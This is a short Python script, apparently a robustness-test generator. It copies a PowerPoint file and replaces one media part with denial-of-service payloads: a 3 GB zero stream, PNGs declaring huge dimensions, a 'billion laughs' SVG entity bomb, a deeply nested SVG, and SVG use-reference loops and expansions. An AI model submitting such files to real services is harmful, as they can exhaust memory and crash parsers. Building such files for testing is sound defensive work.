import sys, zipfile, zlib
src, outdir, media = sys.argv[1], sys.argv[2], sys.argv[3]
z = zipfile.ZipFile(src); base = {n: z.read(n) for n in z.namelist()}
def emit(name, data=None, stream_zeros=0):
    with zipfile.ZipFile("%s/%s.pptx" % (outdir, name), "w", zipfile.ZIP_DEFLATED) as w:
        for n, d in base.items():
            if n == media:
                if stream_zeros:
                    with w.open(n, "w", force_zip64=True) as f:
                        chunk = b"\0" * (1 << 24)
                        for _ in range(stream_zeros // len(chunk)): f.write(chunk)
                else:
                    w.writestr(n, data)
            else:
                w.writestr(n, d)
def png(wd, ht, idat=b"\0" * 1000):
    ihdr = b"IHDR" + wd.to_bytes(4, "big") + ht.to_bytes(4, "big") + bytes([8, 6, 0, 0, 0])
    out = b"\x89PNG\r\n\x1a\n" + (13).to_bytes(4, "big") + ihdr + zlib.crc32(ihdr).to_bytes(4, "big")
    c = zlib.compress(idat)
    out += len(c).to_bytes(4, "big") + b"IDAT" + c + zlib.crc32(b"IDAT" + c).to_bytes(4, "big")
    return out + b"\0\0\0\0IEND\xaeB`\x82"
emit("media_bomb_3g", stream_zeros=3 << 30)
emit("media_png_100k", png(100000, 100000))
emit("media_png_30k", png(30000, 30000))
emit("media_png_8k_full", png(8000, 8000, b"\0" * (8000 * 4 + 1) * 8000))
emit("media_svg_laughs", b'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"><!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;"><!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;"><!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;"><!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;"><!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;">]><svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><text x="0" y="50">&h;</text></svg>')
emit("media_svg_huge", b'<svg xmlns="http://www.w3.org/2000/svg" width="100000000" height="100000000" viewBox="0 0 10 10"><rect width="10" height="10" fill="red"/></svg>')
emit("media_svg_deep", b'<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">' + b"<g>" * 100000 + b"</g>" * 100000 + b"</svg>")
emit("media_svg_use_loop", b'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100"><defs><g id="a"><use xlink:href="#b"/></g><g id="b"><use xlink:href="#a"/></g></defs><use xlink:href="#a"/></svg>')
emit("media_svg_use_expand", b'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100"><defs><rect id="r0" width="1" height="1"/>' + b"".join(b'<g id="r%d"><use xlink:href="#r%d"/><use xlink:href="#r%d"/><use xlink:href="#r%d"/><use xlink:href="#r%d"/></g>' % (i, i - 1, i - 1, i - 1, i - 1) for i in range(1, 16)) + b'</defs><use xlink:href="#r15"/></svg>')
